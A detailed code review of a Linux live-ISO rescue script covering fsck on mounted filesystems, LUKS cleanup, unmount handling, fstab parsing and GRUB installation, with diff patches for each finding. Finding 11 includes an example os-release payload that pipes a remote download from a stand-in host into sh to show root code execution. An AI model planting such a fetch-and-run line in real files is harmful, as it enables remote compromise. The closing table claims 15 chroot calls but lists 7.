# Review: `overlay/system/usr/local/bin/sunshine-rescue`

Reviewer: tak-7a (junior engineer). Date: 2026-11-19.
Scope: the 217-line script was read completely, line 1–217. No source file was changed.
Method: careful reading; reasoning with the three concrete inputs requested; static checks. The script was **not executed** (it requires root, real disks and a live ISO). No VM, docker, pacman, sudo, mount or network operation was run.

## 0. Static checks (exact commands and results)

```console
$ bash -n overlay/system/usr/local/bin/sunshine-rescue
$ echo $?
0

$ PATH=/home/tak/.local/bin:$PATH shellcheck -S warning overlay/system/usr/local/bin/sunshine-rescue
$ echo $?
0
```

`bash -n` passes. **`shellcheck -S warning` produces zero warnings** (exit 0, no output) — there is no warning-level finding to explain. For completeness I also ran plain `shellcheck` (all severities), which exits 1 with only **info** and **style** findings:

* SC2015 (`A && B || C` is not if-then-else) — lines 21, 112, 139, 170, 171, 172, 173, 180, 188. In this script the `&&` right-hand sides are `ok`/`fail`/`bad`/`printf`, which practically always succeed, so `C` does not fire spuriously. The pattern is still fragile: if `ok`/`fail` ever returns non-zero, both the success and failure branch run (e.g. line 139 would print both "every fstab entry…" and "N entries do not match…"). Cosmetic, not part of the fix patch.
* SC1091 (not following a sourced file) — line 21 (`/usr/local/lib/sunshine/ui.sh`, a runtime overlay path) and lines 50/55 (`$tmp/etc/os-release`, discovered at runtime). Line 21 is an expected false positive for a file that only exists on the built ISO. Lines 50/55 were a genuine *security* problem and are fixed in finding 11 (the sourcing is gone, so the warning disappears).
* SC2005 (useless `echo "$(cmd)"`) — lines 125, 148, 162, 188, 191. This is a style warning; the only place where it hid a real problem was line 148 (finding 9). The other four are harmless.

`local` is used **only inside functions** (checked all occurrences: lines 31, 43, 64, 84, 87, 118, 132, 141, 144, 165, 178); there is no `local` at top level. There is no `set -e`/`set -u`; most unbound variables are guarded with `${...:-}`, so adding `set -u` is not required for these findings. Subshell variable loss exists in two places: the `awk | while` at line 95 (finding 5) and, more subtly, `scan` being called through `list=$(scan)` / `line=$(pick …)` at lines 65, 188, 190–196, 209 — this is why the LUKS fix in finding 2 records state in a file rather than in a shell array.

## 1. Numbered findings

Line numbers and quotes refer to the **original** file (217 lines), not to the patched copy.

### 1. CRITICAL — `fsck` can run on a mounted, read-write filesystem (lines 167, 170–173)

> line 167: `  is_mounted && do_umount`
> line 170: `    ext2|ext3|ext4) e2fsck -fy "$dev" >>"$LOG" 2>&1; rc=$?; [ $rc -le 1 ] && ok "$(loc "file system is clean or was repaired")" || fail "e2fsck: exit $rc (see $LOG)";;`

`is_mounted` only tests `$M` (line 80). `scan` skips only devices whose *first* mount target matches `/run/archiso*` or `/` (line 47), so a device mounted at any other path is still selectable. `e2fsck -fy` answers every question with yes and writes repairs; running it on a mounted filesystem can destroy metadata and data. The other checkers mostly refuse a mounted device, but ext4 does not protect the user here.

Concrete failure: an ext4 root `/dev/sda2` is mounted at `/mnt` by the user (or by a previous tool). `sunshine-rescue fsck /dev/sda2` lists it as a candidate (line 47 does not skip `/mnt`), `is_mounted` is false because `$M=/mnt/sunshine-rescue`, and `e2fsck -fy /dev/sda2` checks a live, writable filesystem.

Minimal fix (refuse any device still present in the mount table, before every checker):

```diff
   is_mounted && do_umount
+  if findmnt -rno SOURCE 2>/dev/null | grep -Fq "$dev"; then die "$(loc "file system is still mounted; unmount it before checking") $dev"; fi
   sec "File system check ($fs)"
```

### 2. HIGH — every `sunshine-luks-*` mapping is closed, including ones this tool did not open (lines 30–40, 84)

> line 34: `    if [ ! -e "/dev/mapper/$name" ]; then`
> line 84: `  local m; for m in /dev/mapper/sunshine-luks-*; do [ -e "$m" ] && cryptsetup close "$(basename "$m")" 2>/dev/null; done; true`

`open_luks` opens **every** LUKS container on every disk and never records which ones it opened; line 34 deliberately leaves an already-open mapping alone, but `do_umount` closes all mappings with the tool's prefix anyway. Errors are redirected to `/dev/null` and `true` forces success. `scan` runs inside `$(scan)` (line 65), so a shell variable cannot carry the list back to the parent process.

Concrete failure: two encrypted disks, `/dev/sda3` and `/dev/sdb1`. The user opened `sunshine-luks-sdb1` manually before starting the rescue. `sunshine-rescue repair /dev/sda3` opens `sunshine-luks-sda3`; at the end `do_umount` also tries to close `sunshine-luks-sdb1`. A busy mapping makes `cryptsetup close` fail silently (the user is told "Repair finished"), and a mapping that is merely unused disappears from the live session.

Minimal fix (record opened names on disk because of the subshell; close only recorded names; never close a mapping that is still mounted; report failures):

```diff
+LUKS_STATE=$STATE/luks
...
-  local d name
+  local d name opened
     name=sunshine-luks-$(basename "$d")
+    opened=0
-      if [ -n "${SUNSHINE_LUKS_PASS:-}" ]; then printf %s "$SUNSHINE_LUKS_PASS" | cryptsetup open "$d" "$name" - 2>/dev/null || { bad "$d: $(loc "could not be opened (wrong passphrase?)")" >&2; continue; }
-      elif [ -t 0 ]; then echo "$d $(loc "is encrypted") ..." >&2; cryptsetup open "$d" "$name" </dev/tty >&2 || continue
+      if [ -n "${SUNSHINE_LUKS_PASS:-}" ]; then printf %s "$SUNSHINE_LUKS_PASS" | cryptsetup open "$d" "$name" - 2>/dev/null || { bad "$d: $(loc "could not be opened (wrong passphrase?)")" >&2; continue; }; opened=1
+      elif [ -t 0 ]; then echo "$d $(loc "is encrypted") ..." >&2; cryptsetup open "$d" "$name" </dev/tty >&2 || continue; opened=1
       else continue; fi
     fi
+    [ "$opened" = 1 ] && printf '%s\n' "$name" >> "$LUKS_STATE"
     echo "/dev/mapper/$name"
...
-  local m; for m in /dev/mapper/sunshine-luks-*; do [ -e "$m" ] && cryptsetup close "$(basename "$m")" 2>/dev/null; done; true
+  if [ -f "$LUKS_STATE" ]; then
+    while read -r m; do
+      [ -e "/dev/mapper/$m" ] || continue
+      if findmnt -rno SOURCE 2>/dev/null | grep -Fq "/dev/mapper/$m"; then bad "... still mounted ..."; rc=1; continue; fi
+      cryptsetup close "$m" 2>>"$LOG" || { bad "... could not close ..."; rc=1; }
+    done < "$LUKS_STATE"
+    rm -f "$LUKS_STATE"
+  fi
```

### 3. HIGH — unmount always reports success, and lazy unmount can hide a still-busy filesystem (lines 82–84, 189)

> line 82: `  umount -R "$M" 2>/dev/null || umount -Rl "$M" 2>/dev/null`
> line 84: `  ... done; true`
> line 189: `  umount) do_umount; ok "$(loc "unmounted")" ;;`

`umount -Rl` detaches the mount lazily; processes that still hold it keep writing to the on-disk filesystem. All error output is discarded and the final `true` forces exit 0, so `sunshine-rescue umount` prints "unmounted" even when nothing was unmounted or the LUKS close failed. The same false success propagates through `chroot`, `passwd`, `initramfs`, `bootloader` and `repair` because their last command is `do_umount`.

Concrete failure: an interactive `sunshine-rescue chroot` shell is still open in a second terminal. `umount -R` fails with "target is busy"; `umount -Rl` "succeeds"; the user reads "Repair finished. Restart and remove the live medium." while a process still has the root filesystem open and the LUKS mapping cannot be closed.

Minimal fix (return a real status, warn when lazy unmount was needed, print `ok` only on success):

```diff
-  umount -R "$M" 2>/dev/null || umount -Rl "$M" 2>/dev/null
+  if is_mounted; then
+    if ! umount -R "$M" 2>>"$LOG"; then
+      if umount -Rl "$M" 2>>"$LOG"; then bad "... lazy unmount ..."; else bad "... could not unmount ..."; fi
+      rc=1
+    fi
+  fi
-  ...; true
+  return $rc
...
-  umount) do_umount; ok "$(loc "unmounted")" ;;
+  umount) do_umount && ok "$(loc "unmounted")" ;;
```

### 4. HIGH — no signal trap, and `die` after mounting skips cleanup (lines 19–217, 179–181, 194)

> line 179: `  inchroot id "$user" >/dev/null 2>&1 || die "$user: $(loc "no such user in the installed system")"`
> line 194: `  passwd) user=${1:?user name}; line=$(pick "${2:-}") || exit 1; do_mount "$line"; do_passwd "$user"; do_umount ;;`

There is no `trap` anywhere in the script. Ctrl-C / SIGTERM during `mkinitcpio`, `grub-install`, `chpasswd` or the chroot shell exits immediately, leaving `$M` (and its `/boot`, `/boot/efi`, `/home` submounts) mounted read-write and the LUKS mapping open. In addition, `do_passwd` calls `die` (line 25: `exit 1`) after `do_mount`; the caller's `do_umount` is then never reached.

Concrete failure: `sunshine-rescue passwd nosuchuser /dev/sda2` mounts `/dev/sda2` and `/dev/sda1` on `/boot/efi`, `inchroot id` fails, `die` exits — both filesystems stay mounted read-write until manual cleanup. Or Ctrl-C during `repair` on the LUKS+btrfs example leaves `/dev/mapper/sunshine-luks-sda3` open.

Minimal fix (idempotent cleanup, signal handlers, and a normal return from `do_passwd`):

```diff
+CLEANED=0
 do_umount() {
+  [ "${CLEANED:-0}" = 1 ] && return 0
+  CLEANED=1
...
 }
+trap 'do_umount; exit 130' INT
+trap 'do_umount; exit 143' TERM
+trap 'do_umount; exit 129' HUP
 do_mount() {
+  CLEANED=0            # a new mount may follow an earlier cleanup in the same process
...
-  inchroot id "$user" >/dev/null 2>&1 || die "$user: $(loc "no such user in the installed system")"
+  inchroot id "$user" >/dev/null 2>&1 || { fail "$user: $(loc "no such user in the installed system")"; return 1; }
-  if [ -n "${SUNSHINE_NEW_PASS:-}" ]; then printf ... | inchroot chpasswd && ok ... || die "chpasswd failed"
-  else inchroot passwd "$user" || die "passwd failed"; fi
+  ... || { fail "chpasswd failed"; return 1; }
+  ... || { fail "passwd failed"; return 1; }
...
-  passwd) ...; do_mount "$line"; do_passwd "$user"; do_umount ;;
+  passwd) ...; do_mount "$line"; do_passwd "$user" || { do_umount; exit 1; }; do_umount ;;
```

### 5. HIGH — fstab mounts run in a subshell; failures are invisible and repair reports success (lines 95–100, 204)

> line 95: `  awk '...' "$M/etc/fstab" | while read -r src mp type opts; do`
> line 97: `    mkdir -p "$M$mp"; mountpoint -q "$M$mp" || mount -t "$type" -o "$opts" "$src" "$M$mp" 2>>"$LOG" || mount "$src" "$M$mp" 2>>"$LOG"`
> line 100: `  ok "$(loc "mounted at") $M (...)`

The `while` is the right side of a pipe, so it runs in a subshell: no `fail` counter change could escape even if there were one. Both mount attempts are chained with `||` whose final status is discarded; `mkdir -p` failure is discarded too. `do_mount` then unconditionally prints "mounted at …", writes `STATE/system` and returns 0. Later steps write kernel/GRUB files into an empty directory on the root filesystem instead of the real `/boot`, and line 204 still prints "Repair finished". (Contrast `step_fstab` at line 138, which correctly uses process substitution.)

Concrete failure: ext4 example with `/boot` on `/dev/sda2`'s fstab entry `UUID=<stale> /boot ext4 defaults 0 2`; the UUID does not exist. Both mount attempts fail; `ok "mounted at …"` is printed; `step_kernel` copies `vmlinuz` into the root filesystem's empty `/boot`; `step_boot` may still succeed via the fallback EFI install; final message is "Repair finished".

Minimal fix (process substitution + count failures, except explicitly optional `nofail` devices):

```diff
-  awk '...' "$M/etc/fstab" | while read -r src mp type opts; do
+  while read -r src mp type opts; do
     ...
-    mkdir -p "$M$mp"; mountpoint -q "$M$mp" || mount -t ... || mount "$src" "$M$mp" 2>>"$LOG"
+    mkdir -p "$M$mp" || { fail "..."; continue; }
+    if ! mountpoint -q "$M$mp"; then
+      if ! mount -t "$type" -o "$opts" "$src" "$M$mp" 2>>"$LOG" && ! mount "$src" "$M$mp" 2>>"$LOG"; then
+        case "$opts" in *nofail*) ;; *) fail "$(loc "could not mount") $src $(loc "on") $mp";; esac
+      fi
+    fi
-  done
+  done < <(awk '...' "$M/etc/fstab")
```

### 6. MEDIUM — `noauto` and `x-systemd.automount` entries are never mounted (line 95)

> line 95: `... && $4!~/noauto|x-systemd.automount/ {print $1, $2, $3, $4}' ...`

A rescue tool that repairs GRUB and the kernel needs `/boot` and the ESP mounted regardless of the target's automount policy. Skipping these entries makes `efi_dir` (line 141) report "the EFI partition of the installed system is not mounted (is it in its fstab?)" even though it is in fstab, and makes `step_kernel` write to the wrong `/boot`.

Concrete failure: btrfs example whose fstab has `UUID=<esp> /boot/efi vfat noauto,x-systemd.automount 0 1`. Line 95 skips it; `efi_dir` finds no vfat filesystem under `$M`; `step_boot` fails at line 147 and `repair` exits 1 although the system is healthy. A `noauto` `/boot` partition similarly sends the kernel copy to the root subvolume.

Minimal fix (drop the option exclusion from the awk filter; mount the entry):

```diff
-  awk '... && $4!~/noauto|x-systemd.automount/ {print $1, $2, $3, $4}' ...
+  awk '... {print $1, $2, $3, $4}' ...
```

### 7. MEDIUM — `nofail` entries with a missing device are reported as errors (lines 133–139)

> line 133: `  while read -r src mp; do`
> line 135: `      UUID=*) id=${src#UUID=}; blkid -U "$id" >/dev/null 2>&1 || { bad "fstab: $mp: $(loc "missing UUID") $id"; n=$((n+1)); };,`
> line 139: `  [ $n = 0 ] && ok ... || fail "$n $(loc "fstab entries do not match the partitions: ...")"`

The check looks only at `$1` and `$2`; option `$4` is not even read. `nofail` explicitly means a missing device is acceptable, `noauto`/`x-systemd.automount` entries are not mounted at boot. The tool increments `fails`, so `repair` exits 1 for a correct fstab, and the success message "every fstab entry points to an existing partition" is inaccurate (PARTUUID/PARTLABEL and `/dev/*` entries are not checked at all).

Concrete failure: fstab contains `UUID=<old-usb-uuid> /mnt/backup ext4 nofail 0 2` and the USB disk is absent. `blkid -U` fails, `n=1`, `fail` is called, `repair` ends with "1 step(s) failed" and exit 1.

Minimal fix (read options and skip optional entries):

```diff
-  local n=0 src mp id
-  while read -r src mp; do
+  local n=0 src mp id opts
+  while read -r src mp opts; do
+    case "$opts" in *nofail*|*noauto*|*x-systemd.automount*) continue;; esac
...
-  done < <(awk '... {print $1, $2}' "$M/etc/fstab")
+  done < <(awk '... {print $1, $2, $4}' "$M/etc/fstab")
```

### 8. HIGH — BIOS GRUB is installed to the root disk, with no whole-disk validation (lines 151–155)

> line 151: `    src=$(findmnt -no SOURCE "$M" | sed 's/\[.*//')`
> line 152: `    disk=$(lsblk -rno PKNAME "$src" 2>/dev/null | head -1)`
> line 153: `    case "$src" in /dev/mapper/sunshine-luks-*) disk=$(lsblk -rno PKNAME "/dev/${src##*sunshine-luks-}" 2>/dev/null | head -1);; esac`
> line 155: `    if inchroot grub-install --target=i386-pc --recheck "/dev/$disk" >"$LOG.grub" 2>&1; then ok "GRUB (BIOS) $(loc "installed on") /dev/$disk"; else ...`

The target disk is derived from the **root** filesystem, not from `/boot`. `PKNAME` can be a partition, a `dm-*` device or empty; it is never checked to be `TYPE=disk`. The LUKS branch also assumes the mapping name always encodes the underlying partition (`${src##*sunshine-luks-}`), which is false for a renamed mapping or a stack of mappings. Writing GRUB to the wrong disk overwrites boot code/MBR and leaves the machine unbootable while reporting success.

Concrete failure: root `/dev/sda2`, separate `/boot` on `/dev/sdb1`, BIOS boot order starts from `/dev/sdb`. The script installs to `/dev/sda`, prints "GRUB (BIOS) installed on /dev/sda", and the machine still cannot boot.

Minimal fix (find the filesystem that contains `/boot`, then walk `PKNAME` until `TYPE=disk`):

```diff
-    src=$(findmnt -no SOURCE "$M" | sed 's/\[.*//')
+    src=$(findmnt -no SOURCE -T "$M/boot" 2>/dev/null | sed 's/\[.*//' | head -1)
+    [ -n "$src" ] || src=$(findmnt -no SOURCE "$M" | sed 's/\[.*//' | head -1)
     disk=$(lsblk -rno PKNAME "$src" 2>/dev/null | head -1)
-    case "$src" in /dev/mapper/sunshine-luks-*) disk=$(lsblk -rno PKNAME "/dev/${src##*sunshine-luks-}" 2>/dev/null | head -1);; esac
+    while [ -n "$disk" ] && [ "$(lsblk -rno TYPE "/dev/$disk" 2>/dev/null | head -1)" != disk ]; do disk=$(lsblk -rno PKNAME "/dev/$disk" 2>/dev/null | head -1); done
```

### 9. MEDIUM — any first `grub-install` failure is mislabeled as an NVRAM problem (line 148)

> line 148: `    inchroot grub-install --target=x86_64-efi --efi-directory="$efi" --bootloader-id=SunshineOS --recheck >"$LOG.grub" 2>&1 || echo "$(loc "NVRAM entry could not be written (continuing with the fallback path)")"`

The message claims the NVRAM entry failed even when the real error is a missing `/boot/grub` module, a read-only ESP, a missing `grub-install`, or a wrong `--efi-directory`. It is printed with `echo`, not `bad`/`fail`, and the log is immediately truncated by line 157 (`>"$LOG.grub"`), so the real error can be destroyed. The fallback install is still attempted and its failure is counted, so the final result is not a false success, but the diagnosis is wrong.

Concrete failure: `grub-install` inside the chroot fails because the target has no GRUB package installed; the user is told "NVRAM entry could not be written" and looks at firmware settings instead of installing GRUB.

Minimal fix:

```diff
-    ... || echo "$(loc "NVRAM entry could not be written (continuing with the fallback path)")"
+    ... || bad "$(loc "grub-install (NVRAM) failed, trying the fallback path; see") $LOG.grub"
```

### 10. MEDIUM — a failed `vmlinuz` copy is silent (line 122)

> line 122: `    [ -f "$M/boot/vmlinuz-$base" ] || { [ -f "$k/vmlinuz" ] && cp --sparse=never "$k/vmlinuz" "$M/boot/vmlinuz-$base" && chmod 644 "$M/boot/vmlinuz-$base" && ok "vmlinuz-$base $(loc "restored")"; }`

The `&&` chain is the last command in a `{ …; }` group whose status is discarded. If the source is missing, `/boot` is full, or `chmod` fails, nothing is printed and `fails` is not incremented; `repair` can still report success. (Separately — low severity — a `vmlinuz` that exists but is truncated/corrupt is never checked.)

Concrete failure: ext4 example with `/boot` 99% full; `cp` fails with ENOSPC, the log is not even written (no redirect on `cp`), and the final message is "Repair finished".

Minimal fix:

```diff
-    [ -f "$M/boot/vmlinuz-$base" ] || { ... && ok "... restored"; }
+    if [ ! -f "$M/boot/vmlinuz-$base" ]; then
+      if [ -f "$k/vmlinuz" ] && cp --sparse=never "$k/vmlinuz" "$M/boot/vmlinuz-$base" 2>>"$LOG" && chmod 644 "$M/boot/vmlinuz-$base"; then ok "... restored"; else fail "... could not be restored"; fi
+    fi
```

### 11. HIGH — `/etc/os-release` from the target is sourced as root (lines 50, 55)

> line 50: `      printf '%s\t%s\t%s\n' "$dev" "$fs" "$(. "$tmp/etc/os-release"; echo "${PRETTY_NAME:-Linux}")"`
> line 55: `          printf '%s\t%s\t%s\n' "$dev:$sub" "$fs" "$(. "$tmp/$sub/etc/os-release"; echo "${PRETTY_NAME:-Linux}")"; break`

`os-release` is a shell fragment. Sourcing it from an untrusted/compromised installed system executes arbitrary commands with the live session's root privileges during a read-only `list`/`scan`, before the user selects anything. This is code execution from disk data, and it also lets a malicious file inject tabs/newlines into the tab-separated scan format.

Concrete failure: a target `/etc/os-release` contains `PRETTY_NAME="$(curl http://example/x | sh)"`; `sunshine-rescue list` runs that as root on the live ISO.

Minimal fix (parse the one field instead of sourcing; also removes the SC1091 warning at these lines):

```diff
+osname() { local p; p=$(sed -n 's/^PRETTY_NAME="\{0,1\}\([^"]*\)"\{0,1\}[[:space:]]*$/\1/p' "$1" 2>/dev/null | head -1); printf '%s' "${p:-Linux}"; }
...
-      printf ... "$(. "$tmp/etc/os-release"; echo "${PRETTY_NAME:-Linux}")"
+      printf ... "$(osname "$tmp/etc/os-release")"
...
-          # shellcheck disable=SC1090
-          printf ... "$(. "$tmp/$sub/etc/os-release"; echo "${PRETTY_NAME:-Linux}")"; break
+          printf ... "$(osname "$tmp/$sub/etc/os-release")"; break
```

### 12. MEDIUM — no check that the mounted tree is the system that was selected (lines 92–93)

> line 92: `  if [ "$fs" = btrfs ]; then mount -o "subvol=${sub:-@}" "$dev" "$M" 2>>"$LOG" || mount "$dev" "$M" 2>>"$LOG" || die ...`
> line 93: `  else mount "$dev" "$M" 2>>"$LOG" || die "$(loc "could not mount") $dev"; fi`

`scan` only knows two layouts: top-level `/etc/os-release` (line 49) or subvolume `@`, `root`, `rootfs` (line 52). For a flat btrfs install, `do_mount` first tries `subvol=@`; if a *different* `@` subvolume exists (e.g. a Timeshift snapshot tree), that mount succeeds and the tool never notices it is not the filesystem `scan` inspected. All subsequent writes (pacman, kernel, GRUB, passwd) go to the wrong subvolume. The root mount also ignores the target's fstab root options (`subvolid`, `compress`, `ro`).

Concrete failure: btrfs `/dev/nvme0n1p2` has a flat install at the top level and an unrelated `@` subvolume without `/etc/os-release`. `scan` reports `/dev/nvme0n1p2` (flat), `do_mount` silently mounts `@`, and `repair` edits the wrong tree.

Minimal fix:

```diff
   else mount "$dev" "$M" 2>>"$LOG" || die "..."; fi
+  if [ ! -f "$M/etc/os-release" ] || [ ! -f "$M/etc/fstab" ]; then do_umount; die "$(loc "mounted") $dev $(loc "but it is not the selected system (no /etc/os-release or /etc/fstab)")"; fi
```

### 13. MEDIUM — `sunshine-repo ensure` failure is ignored (line 114)

> line 114: `  if [ -x "$M/usr/local/bin/sunshine-repo" ]; then inchroot /usr/local/bin/sunshine-repo ensure --quiet >>"$LOG" 2>&1; fi`

No status check and no `fail`: a broken repo configuration is repaired silently (or not at all) while `repair` finishes with exit 0. This matters because the following `pacman -S linux linux-firmware` (line 126) depends on that repo.

Concrete failure: the chroot's `sunshine-repo ensure` exits 1 because `/etc/pacman.d/sunshine.conf` is read-only; repair reports success but the next reboot/update still has no `[sunshine]` repo.

Minimal fix:

```diff
-  if [ -x "$M/usr/local/bin/sunshine-repo" ]; then inchroot /usr/local/bin/sunshine-repo ensure --quiet >>"$LOG" 2>&1; fi
+  if [ -x "$M/usr/local/bin/sunshine-repo" ]; then inchroot /usr/local/bin/sunshine-repo ensure --quiet >>"$LOG" 2>&1 || fail "$(loc "sunshine-repo ensure failed")"; fi
```

### 14. MEDIUM — `sunshine-doctor --fix` status is lost (line 161)

> line 161: `  if [ -x "$M/usr/local/bin/sunshine-doctor" ] || [ -x "$M/usr/bin/sunshine-doctor" ]; then inchroot sunshine-doctor --fix 2>&1 | sed 's/^/  /' | tail -40`

The pipeline status is `tail`'s status (0), so a failing doctor never increments `fails`; `tail -40` also hides the first errors. `repair` can print "Repair finished" after the doctor failed to apply its fixes.

Concrete failure: `sunshine-doctor --fix` exits 1 halfway through its fix list; `tail` exits 0; final message is "Repair finished. Restart and remove the live medium.".

Minimal fix:

```diff
-  if [ -x ... ] || [ -x ... ]; then inchroot sunshine-doctor --fix 2>&1 | sed 's/^/  /' | tail -40
+  if [ -x ... ] || [ -x ... ]; then
+    if inchroot sunshine-doctor --fix >"$LOG.doctor" 2>&1; then tail -40 "$LOG.doctor" | sed 's/^/  /'; else fail "sunshine-doctor --fix: $(tail -2 "$LOG.doctor" | tr '\n' ' ')"; fi
   else echo "..."; fi
```

## 2. Lower-severity observations (documented, deliberately not in the patch)

* **LOW, lines 47–48** — `scan` skips only `/run/archiso*` and `/` and only looks at `head -1` of `findmnt`; a device already mounted at `$M` by a previous run or at any other path is scanned again. XFS/f2fs cannot be mounted a second time, so such a system disappears from `list`. Finding 1's guard prevents the dangerous consequence (fsck on it).
* **LOW, line 59** — `umount "$tmp" 2>/dev/null` ignores failure; a leaked read-only mount remains and line 61 `rmdir` fails silently.
* **LOW, line 22** — `SUNSHINE_RESCUE_MNT` is used verbatim; setting it to `/` would make `mount` and `umount -R` operate on the live root. Environment-controlled, not user input.
* **LOW, line 109** — `rm -f "$M/var/lib/pacman/db.lck"` is unconditional; if a pacman process is active in that tree from another chroot, its lock is removed (EOS's `--keyrings-reset` also keeps a backup, which this script does not do at line 112).
* **LOW, line 122** — only the *presence* of `vmlinuz-$base` is checked; a present-but-corrupt image is not compared with `/usr/lib/modules/$k/vmlinuz` (cf. research note, Garuda's `filecmp` check).
* **LOW, line 157** — `>"$LOG.grub"` truncates the output of the two `grub-install` runs, so the error shown for a `grub-mkconfig` failure can be misleading.
* **LOW, line 170** — `e2fsck -fy` performs repairs without asking for consent (`-y`); `rc=2` ("errors corrected, reboot required") is reported as a failure even though it is an expected outcome after repairs.
* **LOW, line 191** — `chroot` discards the exit status of `inchroot /bin/bash`; the branch status is that of `do_umount`.
* **LOW, lines 125, 162, 188, 191** — the SC2005 `echo "$(loc …)"` style warnings listed in section 0.
* **LOW, lines 21, 112, 139, 170–173, 180, 188** — the SC2015 `&& … || …` patterns listed in section 0.
* **No finding**: no `local` outside a function; no `set -u` problem in the current code; `step_fstab` (line 138) correctly uses process substitution; `pick` quotes `$want`/`$i` correctly; the menu quotes `"$u"` at line 215 correctly; `dev`/`sub` splitting at line 89 is correct for device paths; `findmnt` bracket stripping at line 151 is correct for btrfs `[/@]` sources.

## 3. The three requested examples, reasoned through

1. **ext4 `/dev/sda2` root, EFI `/dev/sda1` at `/boot/efi`.** `scan` (line 48) read-only-mounts `/dev/sda2`, finds `/etc/os-release` + `/etc/fstab` (line 49) and emits `/dev/sda2<TAB>ext4<TAB>…`. `do_mount` mounts `/dev/sda2` rw at `$M`; the fstab loop (line 95) mounts the ESP by UUID at `$M/boot/efi`. `efi_dir` (line 141) returns `/boot/efi`; both UEFI `grub-install` calls run, then `grub-mkconfig`. On this machine the BIOS branch is not used. The dangerous gaps are finding 1 (fsck of `/dev/sda2` if it is mounted elsewhere), finding 5 (a missing `/boot` or ESP UUID is silently ignored), finding 11 (os-release sourced as root) and finding 4 (Ctrl-C leaves both mounts behind).
2. **btrfs `/dev/nvme0n1p2`, subvolumes `@` and `@home`, EFI at `/boot/efi`.** `scan` first tries the top level (no os-release), then finds `$tmp/@/etc/os-release` at line 53 and emits `/dev/nvme0n1p2:@`. `do_mount` uses `mount -o subvol=@`; the fstab loop mounts `@home` through the `subvol=@home` option from fstab and mounts the ESP by UUID. `findmnt -no SOURCE "$M"` returns `/dev/nvme0n1p2[/@]` and line 151 correctly strips `[/@]` for the BIOS case. If the layout also has a separate `@boot` subvolume with no fstab line (a common Ubuntu arrangement), this script never mounts it: the kernel copy at line 122 and `grub.cfg` go into the root subvolume's empty `/boot` directory (findings 6 and 12). A `noauto`/`x-systemd.automount` ESP or `@home` is skipped by line 95 (finding 6).
3. **LUKS1 `/dev/sda3` opened as `/dev/mapper/sunshine-luks-sda3`, btrfs inside.** `open_luks` opens `/dev/sda3` with the passphrase (line 35) and prints the mapper; `lsblk` reports `btrfs` on the mapper, and `scan` emits `/dev/mapper/sunshine-luks-sda3:@`. `do_mount` mounts the mapper with `subvol=@`. In the BIOS branch the mapper source is `/dev/mapper/sunshine-luks-sda3[/@]`; line 151 strips the bracket, line 153 extracts `sda3` from the name and gets PKNAME `sda`, so the original code happens to work — but only because the mapping name encodes the partition (finding 8). `do_umount` closes **all** `sunshine-luks-*` mappings, not just this one (finding 2). With a renamed mapping (`--name rescue-root`) the original line 153 produces an empty disk and the branch fails at line 154; the patched PKNAME walk works for both.

## 4. Every message and every `arch-chroot` call

Messages were checked for truthfulness and for where they are printed (`ok`, `bad`, `fail`, `die`, plain `echo`/`printf`):

| Lines | Message / purpose | Assessment |
|---|---|---|
| 21 | `sec`/`ok`/`bad`/`loc`/`t` fallbacks if `ui.sh` is absent | Harmless; SC2015/SC1091 info. |
| 35, 36 | `"could not be opened (wrong passphrase?)"`, `"is encrypted …"` | Fine; errors go to stderr and `continue`. |
| 66, 69, 73 | no system found; not an installed system; "Several systems found; name one" | Fine. `pick` uses `die` before mounting, so no cleanup needed. |
| 100 | `"mounted at $M (name)"` | **Wrong when any fstab mount failed** (finding 5). |
| 106 | `fail` = `bad` + increment | Fine; the counter drives final exit codes. |
| 108, 117, 131, 143, 160, 168 | section headers | Fine. |
| 110, 112 | package DB consistent / damaged; keyring recreated / not | Fine (SC2015 info only). |
| 122 | `"vmlinuz-$base restored"` | Only printed on success, but failure is silent (finding 10). |
| 125 | "No kernel is installed … installing linux" | Fine (SC2005 style). |
| 126, 128 | kernel installed / could not be installed; initramfs rebuilt / mkinitcpio failed | Fine; `tail -4 "$LOG"` shows generic log lines, not just mkinitcpio's. |
| 135, 136, 139 | fstab missing UUID/label; "every fstab entry points to an existing partition"; "N entries do not match…" | **Wrong for `nofail`/`noauto`** and overclaims coverage (finding 7). |
| 147 | "EFI partition … is not mounted (is it in its fstab?)" | Misleading when it is in fstab but was skipped by line 95 (finding 6). |
| 148 | "NVRAM entry could not be written" | **Wrong for every failure cause** (finding 9). |
| 149 | "GRUB (UEFI) installed on $efi" / `grub-install: …` | Accurate for the fallback install. |
| 151, 154 | "cannot find the boot disk" | Can appear with a valid LUKS disk whose name does not encode the partition (finding 8). |
| 155 | "GRUB (BIOS) installed on /dev/$disk" | **Wrong disk possible** (finding 8). |
| 157 | "boot menu rebuilt" / `grub-mkconfig: …` | Correct status; log may have been truncated (low). |
| 162 | "sunshine-doctor is not installed in that system" | Fine (SC2005 style). |
| 170 | "file system is clean or was repaired" / `e2fsck: exit N` | rc=2 treated as failure (low); see finding 1 for the safety issue. |
| 171–173 | btrfs/xfs/f2fs consistent or checker failed | Accurate as status reporting; see finding 1 for running on a mounted device. |
| 174 | "no checker for $fs" | Fine. |
| 179–181 | "no such user", "password changed for", "chpasswd failed", interactive `passwd` | `die` after mount skips cleanup (finding 4). |
| 188 | "No installed Linux system was found." | Can be printed even after a successful `awk` if `awk` fails (SC2015). |
| 189 | `"unmounted"` | **False success** (finding 3). |
| 191 | "You are inside the installed system. Type exit to leave." | Fine; shell exit status discarded (low). |
| 203–205 | blank line; "Repair finished. Restart and remove the live medium."; "N step(s) failed; the log is …" | Final message can be wrong via findings 5, 10, 13, 14. |
| 207, 216 | usage (`sed -n 2,19p "$0"`) | Fine; prints the documented commands including the sudo line 19. |
| 209, 210 | "No installed Linux system was found."; found list | Fine. |
| 211–213 | menu items and prompts | Fine. |
| 215 | "User name: " prompt | Fine; `"$u"` is correctly quoted. |

`arch-chroot` is always called through `inchroot() { arch-chroot "$M" "$@"; }` (line 102) with `"$M"` and each argument quoted; there are no unquoted chroot arguments. The 15 call sites are:

| Line | Command inside chroot | Status handling |
|---|---|---|
| 110 | `pacman -Dk` | checked (silent output) |
| 112 | `bash -c 'pacman-key --init && pacman-key --populate'` | checked via `&& … || fail` (SC2015 info) |
| 114 | `/usr/local/bin/sunshine-repo ensure --quiet` | **ignored** (finding 13) |
| 126 | `pacman -S --noconfirm --needed linux linux-firmware` | checked |
| 128 | `mkinitcpio -P` | checked |
| 148 | `grub-install --target=x86_64-efi --efi-directory="$efi" --bootloader-id=SunshineOS --recheck` | failure **mislabeled**, not counted (finding 9) |
| 149 | `grub-install --target=x86_64-efi --efi-directory="$efi" --removable --recheck` | checked, `fail` + return |
